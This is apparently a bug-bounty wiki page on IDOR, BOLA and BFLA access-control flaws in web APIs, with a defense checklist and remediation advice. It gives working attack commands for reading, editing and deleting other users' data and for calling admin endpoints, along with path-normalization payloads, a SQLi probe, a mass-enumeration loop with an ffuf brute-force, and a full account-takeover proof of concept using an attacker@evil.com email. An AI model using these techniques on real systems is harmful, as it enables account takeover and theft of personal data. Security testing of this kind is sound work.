---
type: wiki
title: "IDOR / BOLA / BFLA Deep Dive (2026 Edition)"
category: attack
tool: burp,autorize,manual
tags:
  - idor
  - bola
  - bfla
  - bopla
  - api-security
  - access-control
status: active
last_updated: 2026-04-21
---

# IDOR / BOLA / BFLA Deep Dive (2026 Edition)

> **Purpose:** OWASP API Top 10 2023 #1 (BOLA) + #5 (BFLA) are consistent high-reward targets. IDOR write = P1-P2, read = P2-P3. UUID predictability / GraphQL batch / mass enumeration are common escalation vectors.

## 0. Terminology

| Term | Full Name | Meaning |
|------|-----------|---------|
| IDOR | Insecure Direct Object Reference | Direct object reference without owner verification |
| BOLA | Broken Object Level Authorization | OWASP API #1: changing `id=` to directly access another user's data |
| BFLA | Broken Function Level Authorization | OWASP API #5: a regular user can invoke admin functionality |
| BOPLA | Broken Object Property Level Auth | OWASP API #3: a user can modify fields they shouldn't be able to (equivalent to mass assignment) |

## 1. Finding IDOR Candidates

### 1.1 Any Endpoint with an ID

```
GET    /api/users/{id}
GET    /api/orders/{id}
PATCH  /api/users/{id}/email
DELETE /api/posts/{id}
POST   /api/teams/{id}/invite
GET    /api/files/{uuid}
GET    /download?file=123
GET    /export?report=5
```

### 1.2 IDs Can Be Hidden In

```
Path: /api/users/5
Query: ?id=5 &user=5 &uid=5
Body (JSON/form): {"id":5}
Header: X-User-Id: 5, Authorization JWT sub claim
Cookie: user_id=5
GraphQL variables
```

### 1.3 Finding "Self" Endpoints

```
GET /me  → returns {id:42, ...}
GET /my/orders
GET /profile

# Use /me to learn your own ID = 42, then try other IDs
```

## 2. ID Types and Bypass Techniques

### 2.1 Integer (Easiest to Exploit)

```bash
# Your ID is 42, try 41, 43
curl -H "Auth: Bearer $TOKEN" /api/users/41
# 200 + another user's data → IDOR
```

### 2.2 UUID -- Hard to Guess but Still Exploitable

**UUID v1 is predictable** (timestamp + MAC):

```bash
# Obtain 2 UUIDv1 values
curl /api/orders → uuid1: d9428888-122b-11e1-b85c-61cd3cbb3210
curl /api/orders → uuid2: d94291e0-122b-11e1-b85c-61cd3cbb3210

# Timestamp segment d9428888 vs d94291e0 → difference is calculable
# Use uuid-rs https://crates.io/crates/uuid or:
python -c "import uuid; u=uuid.UUID('d9428888-...'); print(u.time)"

# Brute-force intermediate values
```

**UUID v4 (truly random) -- bypass techniques**:

1. **Collect leaked UUIDs** (in emails, shared links, logs, old endpoints returning other users' UUIDs)
2. **API returns UUID lists** (GET /api/users returns [{id:uuid},...], combine with BFLA)
3. **Indirect queries via other endpoints** (GET /users?email=victim@x.com → returns UUID)

### 2.3 Hash-based ID (base64 / hex)

```
/files/aHR0cHM6Ly94
# base64 decode → https://x → modify directly
```

### 2.4 Encrypted ID (Need an Oracle)

If the ID is AES-CTR encrypted without HMAC → byte-flip attack (rare but documented cases exist).

## 3. BOLA Attack Techniques

### 3.1 GET -- Reading Other Users' Data

```bash
curl -H "Auth: Bearer $MY_TOKEN" /api/users/VICTIM_ID
# If 200 + data returned → IDOR read
```

### 3.2 PATCH / PUT -- Modifying Other Users' Data

```bash
curl -X PATCH -H "Auth: Bearer $MY_TOKEN" /api/users/VICTIM_ID \
  -d '{"email":"attacker@evil.com"}'
# → Changes victim's email → ATO
```

### 3.3 DELETE -- Deleting Other Users' Data

```bash
curl -X DELETE -H "Auth: Bearer $MY_TOKEN" /api/orders/VICTIM_ORDER
```

### 3.4 Action Endpoints

```
POST /api/users/5/disable-2fa      → Disable another user's 2FA
POST /api/teams/5/remove-member/7  → Remove another user from a team
POST /api/invite/accept?token=...  → Unusual token validation
```

## 4. BFLA (Function-Level)

### 4.1 Calling Admin Endpoints with a User Token

```bash
# Admin-only endpoints
curl -H "Auth: Bearer $MY_USER_TOKEN" /api/admin/users
curl -H "Auth: Bearer $MY_USER_TOKEN" -X POST /api/admin/settings \
  -d '{"maintenance":true}'

# If 200 → BFLA
```

### 4.2 Method Tampering

```bash
# App only allows GET /orders/5 for owner
# But PATCH /orders/5 has no ownership check

curl -X PATCH /api/orders/5 -d '{"status":"refunded"}'
```

### 4.3 HTTP Verb Smuggling

```
X-HTTP-Method-Override: DELETE
_method=DELETE (form parameter)
OPTIONS / HEAD / TRACE bypass
```

### 4.4 Path Normalization

```
/admin/users/..;/users/5              # Tomcat
/admin/users/%2e%2e/users/5           # Nginx
//admin//users/5                      # Double slash
```

## 5. Advanced IDOR

### 5.1 Array / JSON Wrapping

```json
// Normal
{"user_id": 42}

// Array (some parsers take the first, others take the last)
{"user_id": [42, 999]}

// Object wrapping
{"user_id": {"id": 42}}    # If server casts → "[object Object]"
{"user_id": "42', 1)--"}   # Also try SQLi
```

### 5.2 Wildcard / Negative Values

```
/api/users/*
/api/users/-1
/api/users/0
/api/users/%00
/api/users/all
/api/users/.json   # Some frameworks return the entire table
```

### 5.3 Parameter Pollution

```
?user_id=42&user_id=99
# See [69-mass-assignment-hpp.md] for details
```

### 5.4 GraphQL Alias Batching

```graphql
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
  # ... 100+ aliases
}
```

See [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md).

### 5.5 GraphQL `node` Interface

Relay-style: `node(id: "...")` can query any type, and authorization is often overlooked.

### 5.6 Path-level IDOR via UUID Reuse

```
# /api/projects/{PROJ_UUID}/tasks/{TASK_ID}
# If server only checks TASK owner but not whether TASK belongs to PROJ → cross-project IDOR

curl /api/projects/MY_PROJ_UUID/tasks/VICTIM_TASK_ID
# May return 200
```

### 5.7 File ID (Signed URL)

```
/download?file=abc&sig=HMAC

# Extract abc → replace with victim file name, sig becomes invalid
# But if sig only signs the timestamp and not the file name → bypassable
```

## 6. Mass Enumeration (Reading Many IDORs = High Impact)

### 6.1 Integer Sequence

```bash
for i in {1..10000}; do
  curl -s -H "Auth: Bearer $T" /api/users/$i >> dump.json
  sleep 0.1
done
```

**Do not abuse** -- PoC should stop at proving "IDOR exists + verified with 3 random IDs." A full dump will be classified as harmful behavior.

### 6.2 GraphQL Batch

```graphql
# 1000 aliases in 1 request = rate limit barely triggered
```

### 6.3 UUID v1 Time Attack

```python
# Capture a known UUID v1
# Calculate UUIDs for adjacent milliseconds
# Brute-force search
```

## 7. Detection Tools

### 7.1 Autorize (Burp Extension)

```
1. Log in as user A, browse the entire app
2. Burp → Autorize extension → set user B's cookie
3. Autorize replays every request with user B's cookie
4. Check which ones show "Bypass!" (user B received A's data)
```

### 7.2 AuthMatrix (Burp Extension)

Hierarchical testing: guest / user / moderator / admin, automatically tests cross-level BFLA.

### 7.3 Caido + Automate

Similar to Autorize.

### 7.4 ffuf (ID Brute-Force)

```bash
ffuf -u 'https://target.com/api/users/FUZZ' \
  -w <(seq 1 10000) \
  -H "Auth: Bearer $T" -mc 200 -fs 42
```

### 7.5 Nuclei

```bash
nuclei -u https://target.com -tags idor
# Has generic IDOR templates
```

## 8. Full PoC: PATCH /api/users/{id}/email → ATO

### Step 1: Set Up Two Accounts

```
Alice ID=42, token=AT
Bob   ID=43, token=BT
```

### Step 2: Test BOLA Write

```bash
curl -X PATCH https://target.com/api/users/43/email \
  -H "Authorization: Bearer $AT" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Response: 200 {"id":43,"email":"attacker@evil.com"}
# → Bob's email was changed by Alice
```

### Step 3: Chain to ATO via Password Reset

```bash
# Attacker initiates forgot password flow on target.com
curl -X POST https://target.com/api/forgot-password \
  -d '{"email":"attacker@evil.com"}'

# Attacker receives reset link → resets Bob's password → full ATO
```

### Step 4: Report

```markdown
## Vulnerability Summary
PATCH https://target.com/api/users/{id}/email only verifies the caller's
identity but does not check whether the {id} in the URL matches the caller's
own user_id. Any authenticated user can change another user's email address,
then leverage the password reset flow to achieve full account takeover (ATO).

## PoC
[Alice token + PATCH Bob's email → Bob email changed → Attacker reset Bob's password]

## Impact
- Arbitrary account takeover (only requires victim's user_id, which in most apps
  can be obtained via /users/search or inferred from email)
- No victim interaction required

## Severity
P1 / Critical

## Remediation
1. PATCH handler must enforce `req.params.id === req.user.id` or admin role
2. Rails: `before_action :check_owner`
3. All object-level operations should go through a unified authz middleware
4. Sensitive fields (email/phone/password) changes should require re-authentication + email confirmation
```

## 9. Defense Checklist

```
1. Perform ownership check on every resource endpoint
   - Custom `authorize` middleware
   - Rails: `Pundit` / `CanCanCan`
   - Django: `rest_framework.permissions`
   - Spring: `@PreAuthorize("#id == principal.id")`
2. Use GUID v4 instead of auto-incrementing integers
3. Require step-up authentication for sensitive field changes
4. Admin endpoints should use a separate path + middleware (/admin vs /api)
5. Log all authz failures → alert
6. GraphQL: enforce authz check in every resolver, do not rely on root-level checks
7. Always verify ownership of business object IDs; never trust the client
8. Enumeration defense: rate limiting + anomaly detection
```

## Related Documents

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) -- GraphQL alias batch IDOR
- [65-csrf-deep.md](65-csrf-deep.md) -- Combining CSRF with IDOR write
- [69-mass-assignment-hpp.md](69-mass-assignment-hpp.md) -- BOPLA (mass assignment)
- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- PortSwigger IDOR: https://portswigger.net/web-security/access-control/idor
- Autorize: https://github.com/PortSwigger/autorize
